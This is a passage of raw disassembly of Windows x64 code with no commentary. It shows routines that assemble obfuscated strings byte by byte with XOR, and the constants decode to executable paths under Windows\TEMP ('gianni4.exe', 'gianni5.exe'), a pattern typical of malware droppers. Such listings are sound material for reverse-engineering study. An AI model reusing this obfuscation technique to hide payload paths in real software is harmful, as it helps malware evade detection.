   140002bb8:	33 d2                	xor    %edx,%edx
   140002bba:	48 f7 f1             	div    %rcx
   140002bbd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002bc2:	34 54                	xor    $0x54,%al
   140002bc4:	41 88 40 0b          	mov    %al,0xb(%r8)
   140002bc8:	4c 8b c3             	mov    %rbx,%r8
   140002bcb:	48 83 3d dd d9 01 00 	cmpq   $0xf,0x1d9dd(%rip)        # 0x1400205b0
   140002bd2:	0f 
   140002bd3:	b8 0c 00 00 00       	mov    $0xc,%eax
   140002bd8:	4c 0f 47 05 b8 d9 01 	cmova  0x1d9b8(%rip),%r8        # 0x140020598
   140002bdf:	00 
   140002be0:	33 d2                	xor    %edx,%edx
   140002be2:	48 f7 f1             	div    %rcx
   140002be5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002bea:	34 45                	xor    $0x45,%al
   140002bec:	41 88 40 0c          	mov    %al,0xc(%r8)
   140002bf0:	4c 8b c3             	mov    %rbx,%r8
   140002bf3:	48 83 3d b5 d9 01 00 	cmpq   $0xf,0x1d9b5(%rip)        # 0x1400205b0
   140002bfa:	0f 
   140002bfb:	b8 0d 00 00 00       	mov    $0xd,%eax
   140002c00:	4c 0f 47 05 90 d9 01 	cmova  0x1d990(%rip),%r8        # 0x140020598
   140002c07:	00 
   140002c08:	33 d2                	xor    %edx,%edx
   140002c0a:	48 f7 f1             	div    %rcx
   140002c0d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002c12:	34 4d                	xor    $0x4d,%al
   140002c14:	41 88 40 0d          	mov    %al,0xd(%r8)
   140002c18:	4c 8b c3             	mov    %rbx,%r8
   140002c1b:	48 83 3d 8d d9 01 00 	cmpq   $0xf,0x1d98d(%rip)        # 0x1400205b0
   140002c22:	0f 
   140002c23:	b8 0e 00 00 00       	mov    $0xe,%eax
   140002c28:	4c 0f 47 05 68 d9 01 	cmova  0x1d968(%rip),%r8        # 0x140020598
   140002c2f:	00 
   140002c30:	33 d2                	xor    %edx,%edx
   140002c32:	48 f7 f1             	div    %rcx
   140002c35:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002c3a:	34 50                	xor    $0x50,%al
   140002c3c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140002c40:	4c 8b c3             	mov    %rbx,%r8
   140002c43:	48 83 3d 65 d9 01 00 	cmpq   $0xf,0x1d965(%rip)        # 0x1400205b0
   140002c4a:	0f 
   140002c4b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140002c50:	4c 0f 47 05 40 d9 01 	cmova  0x1d940(%rip),%r8        # 0x140020598
   140002c57:	00 
   140002c58:	33 d2                	xor    %edx,%edx
   140002c5a:	48 f7 f1             	div    %rcx
   140002c5d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002c62:	34 5c                	xor    $0x5c,%al
   140002c64:	41 88 40 0f          	mov    %al,0xf(%r8)
   140002c68:	4c 8b c3             	mov    %rbx,%r8
   140002c6b:	48 83 3d 3d d9 01 00 	cmpq   $0xf,0x1d93d(%rip)        # 0x1400205b0
   140002c72:	0f 
   140002c73:	b8 10 00 00 00       	mov    $0x10,%eax
   140002c78:	4c 0f 47 05 18 d9 01 	cmova  0x1d918(%rip),%r8        # 0x140020598
   140002c7f:	00 
   140002c80:	33 d2                	xor    %edx,%edx
   140002c82:	48 f7 f1             	div    %rcx
   140002c85:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002c8a:	34 67                	xor    $0x67,%al
   140002c8c:	41 88 40 10          	mov    %al,0x10(%r8)
   140002c90:	4c 8b c3             	mov    %rbx,%r8
   140002c93:	48 83 3d 15 d9 01 00 	cmpq   $0xf,0x1d915(%rip)        # 0x1400205b0
   140002c9a:	0f 
   140002c9b:	b8 11 00 00 00       	mov    $0x11,%eax
   140002ca0:	4c 0f 47 05 f0 d8 01 	cmova  0x1d8f0(%rip),%r8        # 0x140020598
   140002ca7:	00 
   140002ca8:	33 d2                	xor    %edx,%edx
   140002caa:	48 f7 f1             	div    %rcx
   140002cad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002cb2:	34 69                	xor    $0x69,%al
   140002cb4:	41 88 40 11          	mov    %al,0x11(%r8)
   140002cb8:	4c 8b c3             	mov    %rbx,%r8
   140002cbb:	48 83 3d ed d8 01 00 	cmpq   $0xf,0x1d8ed(%rip)        # 0x1400205b0
   140002cc2:	0f 
   140002cc3:	b8 12 00 00 00       	mov    $0x12,%eax
   140002cc8:	4c 0f 47 05 c8 d8 01 	cmova  0x1d8c8(%rip),%r8        # 0x140020598
   140002ccf:	00 
   140002cd0:	33 d2                	xor    %edx,%edx
   140002cd2:	48 f7 f1             	div    %rcx
   140002cd5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002cda:	34 61                	xor    $0x61,%al
   140002cdc:	41 88 40 12          	mov    %al,0x12(%r8)
   140002ce0:	4c 8b c3             	mov    %rbx,%r8
   140002ce3:	48 83 3d c5 d8 01 00 	cmpq   $0xf,0x1d8c5(%rip)        # 0x1400205b0
   140002cea:	0f 
   140002ceb:	b8 13 00 00 00       	mov    $0x13,%eax
   140002cf0:	4c 0f 47 05 a0 d8 01 	cmova  0x1d8a0(%rip),%r8        # 0x140020598
   140002cf7:	00 
   140002cf8:	33 d2                	xor    %edx,%edx
   140002cfa:	48 f7 f1             	div    %rcx
   140002cfd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002d02:	34 6e                	xor    $0x6e,%al
   140002d04:	41 88 40 13          	mov    %al,0x13(%r8)
   140002d08:	4c 8b c3             	mov    %rbx,%r8
   140002d0b:	48 83 3d 9d d8 01 00 	cmpq   $0xf,0x1d89d(%rip)        # 0x1400205b0
   140002d12:	0f 
   140002d13:	b8 14 00 00 00       	mov    $0x14,%eax
   140002d18:	4c 0f 47 05 78 d8 01 	cmova  0x1d878(%rip),%r8        # 0x140020598
   140002d1f:	00 
   140002d20:	33 d2                	xor    %edx,%edx
   140002d22:	48 f7 f1             	div    %rcx
   140002d25:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002d2a:	34 6e                	xor    $0x6e,%al
   140002d2c:	41 88 40 14          	mov    %al,0x14(%r8)
   140002d30:	4c 8b c3             	mov    %rbx,%r8
   140002d33:	48 83 3d 75 d8 01 00 	cmpq   $0xf,0x1d875(%rip)        # 0x1400205b0
   140002d3a:	0f 
   140002d3b:	b8 15 00 00 00       	mov    $0x15,%eax
   140002d40:	4c 0f 47 05 50 d8 01 	cmova  0x1d850(%rip),%r8        # 0x140020598
   140002d47:	00 
   140002d48:	33 d2                	xor    %edx,%edx
   140002d4a:	48 f7 f1             	div    %rcx
   140002d4d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002d52:	34 69                	xor    $0x69,%al
   140002d54:	41 88 40 15          	mov    %al,0x15(%r8)
   140002d58:	4c 8b c3             	mov    %rbx,%r8
   140002d5b:	48 83 3d 4d d8 01 00 	cmpq   $0xf,0x1d84d(%rip)        # 0x1400205b0
   140002d62:	0f 
   140002d63:	b8 16 00 00 00       	mov    $0x16,%eax
   140002d68:	4c 0f 47 05 28 d8 01 	cmova  0x1d828(%rip),%r8        # 0x140020598
   140002d6f:	00 
   140002d70:	33 d2                	xor    %edx,%edx
   140002d72:	48 f7 f1             	div    %rcx
   140002d75:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002d7a:	34 34                	xor    $0x34,%al
   140002d7c:	41 88 40 16          	mov    %al,0x16(%r8)
   140002d80:	4c 8b c3             	mov    %rbx,%r8
   140002d83:	48 83 3d 25 d8 01 00 	cmpq   $0xf,0x1d825(%rip)        # 0x1400205b0
   140002d8a:	0f 
   140002d8b:	b8 17 00 00 00       	mov    $0x17,%eax
   140002d90:	4c 0f 47 05 00 d8 01 	cmova  0x1d800(%rip),%r8        # 0x140020598
   140002d97:	00 
   140002d98:	33 d2                	xor    %edx,%edx
   140002d9a:	48 f7 f1             	div    %rcx
   140002d9d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002da2:	34 2e                	xor    $0x2e,%al
   140002da4:	41 88 40 17          	mov    %al,0x17(%r8)
   140002da8:	4c 8b c3             	mov    %rbx,%r8
   140002dab:	48 83 3d fd d7 01 00 	cmpq   $0xf,0x1d7fd(%rip)        # 0x1400205b0
   140002db2:	0f 
   140002db3:	b8 18 00 00 00       	mov    $0x18,%eax
   140002db8:	4c 0f 47 05 d8 d7 01 	cmova  0x1d7d8(%rip),%r8        # 0x140020598
   140002dbf:	00 
   140002dc0:	33 d2                	xor    %edx,%edx
   140002dc2:	48 f7 f1             	div    %rcx
   140002dc5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002dca:	34 65                	xor    $0x65,%al
   140002dcc:	41 88 40 18          	mov    %al,0x18(%r8)
   140002dd0:	4c 8b c3             	mov    %rbx,%r8
   140002dd3:	48 83 3d d5 d7 01 00 	cmpq   $0xf,0x1d7d5(%rip)        # 0x1400205b0
   140002dda:	0f 
   140002ddb:	b8 19 00 00 00       	mov    $0x19,%eax
   140002de0:	4c 0f 47 05 b0 d7 01 	cmova  0x1d7b0(%rip),%r8        # 0x140020598
   140002de7:	00 
   140002de8:	33 d2                	xor    %edx,%edx
   140002dea:	48 f7 f1             	div    %rcx
   140002ded:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002df2:	34 78                	xor    $0x78,%al
   140002df4:	41 88 40 19          	mov    %al,0x19(%r8)
   140002df8:	4c 8b c3             	mov    %rbx,%r8
   140002dfb:	48 83 3d ad d7 01 00 	cmpq   $0xf,0x1d7ad(%rip)        # 0x1400205b0
   140002e02:	0f 
   140002e03:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140002e08:	4c 0f 47 05 88 d7 01 	cmova  0x1d788(%rip),%r8        # 0x140020598
   140002e0f:	00 
   140002e10:	33 d2                	xor    %edx,%edx
   140002e12:	48 f7 f1             	div    %rcx
   140002e15:	48 8b c3             	mov    %rbx,%rax
   140002e18:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140002e1d:	80 f1 65             	xor    $0x65,%cl
   140002e20:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140002e24:	48 83 c4 30          	add    $0x30,%rsp
   140002e28:	5b                   	pop    %rbx
   140002e29:	c3                   	ret
   140002e2a:	cc                   	int3
   140002e2b:	cc                   	int3
   140002e2c:	cc                   	int3
   140002e2d:	cc                   	int3
   140002e2e:	cc                   	int3
   140002e2f:	cc                   	int3
   140002e30:	40 53                	rex push %rbx
   140002e32:	48 83 ec 30          	sub    $0x30,%rsp
   140002e36:	48 8d 1d 5b d6 01 00 	lea    0x1d65b(%rip),%rbx        # 0x140020498
   140002e3d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140002e42:	48 8b cb             	mov    %rbx,%rcx
   140002e45:	e8 16 36 00 00       	call   0x140006460
   140002e4a:	4c 8d 0d 97 ba 00 00 	lea    0xba97(%rip),%r9        # 0x14000e8e8
   140002e51:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002e58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002e5f:	00 
   140002e60:	48 ff c1             	inc    %rcx
   140002e63:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140002e68:	75 f6                	jne    0x140002e60
   140002e6a:	48 83 3d 3e d6 01 00 	cmpq   $0xf,0x1d63e(%rip)        # 0x1400204b0
   140002e71:	0f 
   140002e72:	48 8b c3             	mov    %rbx,%rax
   140002e75:	4c 8b c3             	mov    %rbx,%r8
   140002e78:	48 0f 47 05 18 d6 01 	cmova  0x1d618(%rip),%rax        # 0x140020498
   140002e7f:	00 
   140002e80:	c6 00 25             	movb   $0x25,(%rax)
   140002e83:	b8 01 00 00 00       	mov    $0x1,%eax
   140002e88:	48 83 3d 20 d6 01 00 	cmpq   $0xf,0x1d620(%rip)        # 0x1400204b0
   140002e8f:	0f 
   140002e90:	4c 0f 47 05 00 d6 01 	cmova  0x1d600(%rip),%r8        # 0x140020498
   140002e97:	00 
   140002e98:	33 d2                	xor    %edx,%edx
   140002e9a:	48 f7 f1             	div    %rcx
   140002e9d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002ea2:	34 3a                	xor    $0x3a,%al
   140002ea4:	41 88 40 01          	mov    %al,0x1(%r8)
   140002ea8:	4c 8b c3             	mov    %rbx,%r8
   140002eab:	48 83 3d fd d5 01 00 	cmpq   $0xf,0x1d5fd(%rip)        # 0x1400204b0
   140002eb2:	0f 
   140002eb3:	b8 02 00 00 00       	mov    $0x2,%eax
   140002eb8:	4c 0f 47 05 d8 d5 01 	cmova  0x1d5d8(%rip),%r8        # 0x140020498
   140002ebf:	00 
   140002ec0:	33 d2                	xor    %edx,%edx
   140002ec2:	48 f7 f1             	div    %rcx
   140002ec5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002eca:	34 5c                	xor    $0x5c,%al
   140002ecc:	41 88 40 02          	mov    %al,0x2(%r8)
   140002ed0:	4c 8b c3             	mov    %rbx,%r8
   140002ed3:	48 83 3d d5 d5 01 00 	cmpq   $0xf,0x1d5d5(%rip)        # 0x1400204b0
   140002eda:	0f 
   140002edb:	b8 03 00 00 00       	mov    $0x3,%eax
   140002ee0:	4c 0f 47 05 b0 d5 01 	cmova  0x1d5b0(%rip),%r8        # 0x140020498
   140002ee7:	00 
   140002ee8:	33 d2                	xor    %edx,%edx
   140002eea:	48 f7 f1             	div    %rcx
   140002eed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002ef2:	34 57                	xor    $0x57,%al
   140002ef4:	41 88 40 03          	mov    %al,0x3(%r8)
   140002ef8:	4c 8b c3             	mov    %rbx,%r8
   140002efb:	48 83 3d ad d5 01 00 	cmpq   $0xf,0x1d5ad(%rip)        # 0x1400204b0
   140002f02:	0f 
   140002f03:	b8 04 00 00 00       	mov    $0x4,%eax
   140002f08:	4c 0f 47 05 88 d5 01 	cmova  0x1d588(%rip),%r8        # 0x140020498
   140002f0f:	00 
   140002f10:	33 d2                	xor    %edx,%edx
   140002f12:	48 f7 f1             	div    %rcx
   140002f15:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002f1a:	34 69                	xor    $0x69,%al
   140002f1c:	41 88 40 04          	mov    %al,0x4(%r8)
   140002f20:	4c 8b c3             	mov    %rbx,%r8
   140002f23:	48 83 3d 85 d5 01 00 	cmpq   $0xf,0x1d585(%rip)        # 0x1400204b0
   140002f2a:	0f 
   140002f2b:	b8 05 00 00 00       	mov    $0x5,%eax
   140002f30:	4c 0f 47 05 60 d5 01 	cmova  0x1d560(%rip),%r8        # 0x140020498
   140002f37:	00 
   140002f38:	33 d2                	xor    %edx,%edx
   140002f3a:	48 f7 f1             	div    %rcx
   140002f3d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002f42:	34 6e                	xor    $0x6e,%al
   140002f44:	41 88 40 05          	mov    %al,0x5(%r8)
   140002f48:	4c 8b c3             	mov    %rbx,%r8
   140002f4b:	48 83 3d 5d d5 01 00 	cmpq   $0xf,0x1d55d(%rip)        # 0x1400204b0
   140002f52:	0f 
   140002f53:	b8 06 00 00 00       	mov    $0x6,%eax
   140002f58:	4c 0f 47 05 38 d5 01 	cmova  0x1d538(%rip),%r8        # 0x140020498
   140002f5f:	00 
   140002f60:	33 d2                	xor    %edx,%edx
   140002f62:	48 f7 f1             	div    %rcx
   140002f65:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002f6a:	34 64                	xor    $0x64,%al
   140002f6c:	41 88 40 06          	mov    %al,0x6(%r8)
   140002f70:	4c 8b c3             	mov    %rbx,%r8
   140002f73:	48 83 3d 35 d5 01 00 	cmpq   $0xf,0x1d535(%rip)        # 0x1400204b0
   140002f7a:	0f 
   140002f7b:	b8 07 00 00 00       	mov    $0x7,%eax
   140002f80:	4c 0f 47 05 10 d5 01 	cmova  0x1d510(%rip),%r8        # 0x140020498
   140002f87:	00 
   140002f88:	33 d2                	xor    %edx,%edx
   140002f8a:	48 f7 f1             	div    %rcx
   140002f8d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002f92:	34 6f                	xor    $0x6f,%al
   140002f94:	41 88 40 07          	mov    %al,0x7(%r8)
   140002f98:	4c 8b c3             	mov    %rbx,%r8
   140002f9b:	48 83 3d 0d d5 01 00 	cmpq   $0xf,0x1d50d(%rip)        # 0x1400204b0
   140002fa2:	0f 
   140002fa3:	b8 08 00 00 00       	mov    $0x8,%eax
   140002fa8:	4c 0f 47 05 e8 d4 01 	cmova  0x1d4e8(%rip),%r8        # 0x140020498
   140002faf:	00 
   140002fb0:	33 d2                	xor    %edx,%edx
   140002fb2:	48 f7 f1             	div    %rcx
   140002fb5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002fba:	34 77                	xor    $0x77,%al
   140002fbc:	41 88 40 08          	mov    %al,0x8(%r8)
   140002fc0:	4c 8b c3             	mov    %rbx,%r8
   140002fc3:	48 83 3d e5 d4 01 00 	cmpq   $0xf,0x1d4e5(%rip)        # 0x1400204b0
   140002fca:	0f 
   140002fcb:	b8 09 00 00 00       	mov    $0x9,%eax
   140002fd0:	4c 0f 47 05 c0 d4 01 	cmova  0x1d4c0(%rip),%r8        # 0x140020498
   140002fd7:	00 
   140002fd8:	33 d2                	xor    %edx,%edx
   140002fda:	48 f7 f1             	div    %rcx
   140002fdd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002fe2:	34 73                	xor    $0x73,%al
   140002fe4:	41 88 40 09          	mov    %al,0x9(%r8)
   140002fe8:	4c 8b c3             	mov    %rbx,%r8
   140002feb:	48 83 3d bd d4 01 00 	cmpq   $0xf,0x1d4bd(%rip)        # 0x1400204b0
   140002ff2:	0f 
   140002ff3:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002ff8:	4c 0f 47 05 98 d4 01 	cmova  0x1d498(%rip),%r8        # 0x140020498
   140002fff:	00 
   140003000:	33 d2                	xor    %edx,%edx
   140003002:	48 f7 f1             	div    %rcx
   140003005:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000300a:	34 5c                	xor    $0x5c,%al
   14000300c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140003010:	4c 8b c3             	mov    %rbx,%r8
   140003013:	48 83 3d 95 d4 01 00 	cmpq   $0xf,0x1d495(%rip)        # 0x1400204b0
   14000301a:	0f 
   14000301b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140003020:	4c 0f 47 05 70 d4 01 	cmova  0x1d470(%rip),%r8        # 0x140020498
   140003027:	00 
   140003028:	33 d2                	xor    %edx,%edx
   14000302a:	48 f7 f1             	div    %rcx
   14000302d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003032:	34 54                	xor    $0x54,%al
   140003034:	41 88 40 0b          	mov    %al,0xb(%r8)
   140003038:	4c 8b c3             	mov    %rbx,%r8
   14000303b:	48 83 3d 6d d4 01 00 	cmpq   $0xf,0x1d46d(%rip)        # 0x1400204b0
   140003042:	0f 
   140003043:	b8 0c 00 00 00       	mov    $0xc,%eax
   140003048:	4c 0f 47 05 48 d4 01 	cmova  0x1d448(%rip),%r8        # 0x140020498
   14000304f:	00 
   140003050:	33 d2                	xor    %edx,%edx
   140003052:	48 f7 f1             	div    %rcx
   140003055:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000305a:	34 45                	xor    $0x45,%al
   14000305c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140003060:	4c 8b c3             	mov    %rbx,%r8
   140003063:	48 83 3d 45 d4 01 00 	cmpq   $0xf,0x1d445(%rip)        # 0x1400204b0
   14000306a:	0f 
   14000306b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140003070:	4c 0f 47 05 20 d4 01 	cmova  0x1d420(%rip),%r8        # 0x140020498
   140003077:	00 
   140003078:	33 d2                	xor    %edx,%edx
   14000307a:	48 f7 f1             	div    %rcx
   14000307d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003082:	34 4d                	xor    $0x4d,%al
   140003084:	41 88 40 0d          	mov    %al,0xd(%r8)
   140003088:	4c 8b c3             	mov    %rbx,%r8
   14000308b:	48 83 3d 1d d4 01 00 	cmpq   $0xf,0x1d41d(%rip)        # 0x1400204b0
   140003092:	0f 
   140003093:	b8 0e 00 00 00       	mov    $0xe,%eax
   140003098:	4c 0f 47 05 f8 d3 01 	cmova  0x1d3f8(%rip),%r8        # 0x140020498
   14000309f:	00 
   1400030a0:	33 d2                	xor    %edx,%edx
   1400030a2:	48 f7 f1             	div    %rcx
   1400030a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400030aa:	34 50                	xor    $0x50,%al
   1400030ac:	41 88 40 0e          	mov    %al,0xe(%r8)
   1400030b0:	4c 8b c3             	mov    %rbx,%r8
   1400030b3:	48 83 3d f5 d3 01 00 	cmpq   $0xf,0x1d3f5(%rip)        # 0x1400204b0
   1400030ba:	0f 
   1400030bb:	b8 0f 00 00 00       	mov    $0xf,%eax
   1400030c0:	4c 0f 47 05 d0 d3 01 	cmova  0x1d3d0(%rip),%r8        # 0x140020498
   1400030c7:	00 
   1400030c8:	33 d2                	xor    %edx,%edx
   1400030ca:	48 f7 f1             	div    %rcx
   1400030cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400030d2:	34 5c                	xor    $0x5c,%al
   1400030d4:	41 88 40 0f          	mov    %al,0xf(%r8)
   1400030d8:	4c 8b c3             	mov    %rbx,%r8
   1400030db:	48 83 3d cd d3 01 00 	cmpq   $0xf,0x1d3cd(%rip)        # 0x1400204b0
   1400030e2:	0f 
   1400030e3:	b8 10 00 00 00       	mov    $0x10,%eax
   1400030e8:	4c 0f 47 05 a8 d3 01 	cmova  0x1d3a8(%rip),%r8        # 0x140020498
   1400030ef:	00 
   1400030f0:	33 d2                	xor    %edx,%edx
   1400030f2:	48 f7 f1             	div    %rcx
   1400030f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400030fa:	34 67                	xor    $0x67,%al
   1400030fc:	41 88 40 10          	mov    %al,0x10(%r8)
   140003100:	4c 8b c3             	mov    %rbx,%r8
   140003103:	48 83 3d a5 d3 01 00 	cmpq   $0xf,0x1d3a5(%rip)        # 0x1400204b0
   14000310a:	0f 
   14000310b:	b8 11 00 00 00       	mov    $0x11,%eax
   140003110:	4c 0f 47 05 80 d3 01 	cmova  0x1d380(%rip),%r8        # 0x140020498
   140003117:	00 
   140003118:	33 d2                	xor    %edx,%edx
   14000311a:	48 f7 f1             	div    %rcx
   14000311d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003122:	34 69                	xor    $0x69,%al
   140003124:	41 88 40 11          	mov    %al,0x11(%r8)
   140003128:	4c 8b c3             	mov    %rbx,%r8
   14000312b:	48 83 3d 7d d3 01 00 	cmpq   $0xf,0x1d37d(%rip)        # 0x1400204b0
   140003132:	0f 
   140003133:	b8 12 00 00 00       	mov    $0x12,%eax
   140003138:	4c 0f 47 05 58 d3 01 	cmova  0x1d358(%rip),%r8        # 0x140020498
   14000313f:	00 
   140003140:	33 d2                	xor    %edx,%edx
   140003142:	48 f7 f1             	div    %rcx
   140003145:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000314a:	34 61                	xor    $0x61,%al
   14000314c:	41 88 40 12          	mov    %al,0x12(%r8)
   140003150:	4c 8b c3             	mov    %rbx,%r8
   140003153:	48 83 3d 55 d3 01 00 	cmpq   $0xf,0x1d355(%rip)        # 0x1400204b0
   14000315a:	0f 
   14000315b:	b8 13 00 00 00       	mov    $0x13,%eax
   140003160:	4c 0f 47 05 30 d3 01 	cmova  0x1d330(%rip),%r8        # 0x140020498
   140003167:	00 
   140003168:	33 d2                	xor    %edx,%edx
   14000316a:	48 f7 f1             	div    %rcx
   14000316d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003172:	34 6e                	xor    $0x6e,%al
   140003174:	41 88 40 13          	mov    %al,0x13(%r8)
   140003178:	4c 8b c3             	mov    %rbx,%r8
   14000317b:	48 83 3d 2d d3 01 00 	cmpq   $0xf,0x1d32d(%rip)        # 0x1400204b0
   140003182:	0f 
   140003183:	b8 14 00 00 00       	mov    $0x14,%eax
   140003188:	4c 0f 47 05 08 d3 01 	cmova  0x1d308(%rip),%r8        # 0x140020498
   14000318f:	00 
   140003190:	33 d2                	xor    %edx,%edx
   140003192:	48 f7 f1             	div    %rcx
   140003195:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000319a:	34 6e                	xor    $0x6e,%al
   14000319c:	41 88 40 14          	mov    %al,0x14(%r8)
   1400031a0:	4c 8b c3             	mov    %rbx,%r8
   1400031a3:	48 83 3d 05 d3 01 00 	cmpq   $0xf,0x1d305(%rip)        # 0x1400204b0
   1400031aa:	0f 
   1400031ab:	b8 15 00 00 00       	mov    $0x15,%eax
   1400031b0:	4c 0f 47 05 e0 d2 01 	cmova  0x1d2e0(%rip),%r8        # 0x140020498
   1400031b7:	00 
   1400031b8:	33 d2                	xor    %edx,%edx
   1400031ba:	48 f7 f1             	div    %rcx
   1400031bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400031c2:	34 69                	xor    $0x69,%al
   1400031c4:	41 88 40 15          	mov    %al,0x15(%r8)
   1400031c8:	4c 8b c3             	mov    %rbx,%r8
   1400031cb:	48 83 3d dd d2 01 00 	cmpq   $0xf,0x1d2dd(%rip)        # 0x1400204b0
   1400031d2:	0f 
   1400031d3:	b8 16 00 00 00       	mov    $0x16,%eax
   1400031d8:	4c 0f 47 05 b8 d2 01 	cmova  0x1d2b8(%rip),%r8        # 0x140020498
   1400031df:	00 
   1400031e0:	33 d2                	xor    %edx,%edx
   1400031e2:	48 f7 f1             	div    %rcx
   1400031e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400031ea:	34 35                	xor    $0x35,%al
   1400031ec:	41 88 40 16          	mov    %al,0x16(%r8)
   1400031f0:	4c 8b c3             	mov    %rbx,%r8
   1400031f3:	48 83 3d b5 d2 01 00 	cmpq   $0xf,0x1d2b5(%rip)        # 0x1400204b0
   1400031fa:	0f 
   1400031fb:	b8 17 00 00 00       	mov    $0x17,%eax
   140003200:	4c 0f 47 05 90 d2 01 	cmova  0x1d290(%rip),%r8        # 0x140020498
   140003207:	00 
   140003208:	33 d2                	xor    %edx,%edx
   14000320a:	48 f7 f1             	div    %rcx
   14000320d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003212:	34 2e                	xor    $0x2e,%al
   140003214:	41 88 40 17          	mov    %al,0x17(%r8)
   140003218:	4c 8b c3             	mov    %rbx,%r8
   14000321b:	48 83 3d 8d d2 01 00 	cmpq   $0xf,0x1d28d(%rip)        # 0x1400204b0
   140003222:	0f 
   140003223:	b8 18 00 00 00       	mov    $0x18,%eax
   140003228:	4c 0f 47 05 68 d2 01 	cmova  0x1d268(%rip),%r8        # 0x140020498
   14000322f:	00 
   140003230:	33 d2                	xor    %edx,%edx
   140003232:	48 f7 f1             	div    %rcx
   140003235:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000323a:	34 65                	xor    $0x65,%al
   14000323c:	41 88 40 18          	mov    %al,0x18(%r8)
   140003240:	4c 8b c3             	mov    %rbx,%r8
   140003243:	48 83 3d 65 d2 01 00 	cmpq   $0xf,0x1d265(%rip)        # 0x1400204b0
   14000324a:	0f 
   14000324b:	b8 19 00 00 00       	mov    $0x19,%eax
   140003250:	4c 0f 47 05 40 d2 01 	cmova  0x1d240(%rip),%r8        # 0x140020498
   140003257:	00 
   140003258:	33 d2                	xor    %edx,%edx
   14000325a:	48 f7 f1             	div    %rcx
   14000325d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140003262:	34 78                	xor    $0x78,%al
   140003264:	41 88 40 19          	mov    %al,0x19(%r8)
   140003268:	4c 8b c3             	mov    %rbx,%r8
   14000326b:	48 83 3d 3d d2 01 00 	cmpq   $0xf,0x1d23d(%rip)        # 0x1400204b0
   140003272:	0f 
   140003273:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140003278:	4c 0f 47 05 18 d2 01 	cmova  0x1d218(%rip),%r8        # 0x140020498
   14000327f:	00 
   140003280:	33 d2                	xor    %edx,%edx
   140003282:	48 f7 f1             	div    %rcx
   140003285:	48 8b c3             	mov    %rbx,%rax
   140003288:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   14000328d:	80 f1 65             	xor    $0x65,%cl
   140003290:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140003294:	48 83 c4 30          	add    $0x30,%rsp
   140003298:	5b                   	pop    %rbx
   140003299:	c3                   	ret
   14000329a:	cc                   	int3
   14000329b:	cc                   	int3
   14000329c:	cc                   	int3
   14000329d:	cc                   	int3
   14000329e:	cc                   	int3
   14000329f:	cc                   	int3
   1400032a0:	40 53                	rex push %rbx
   1400032a2:	48 83 ec 30          	sub    $0x30,%rsp
   1400032a6:	48 8d 1d ab d2 01 00 	lea    0x1d2ab(%rip),%rbx        # 0x140020558
   1400032ad:	ba 1b 00 00 00       	mov    $0x1b,%edx
   1400032b2:	48 8b cb             	mov    %rbx,%rcx
   1400032b5:	e8 a6 31 00 00       	call   0x140006460
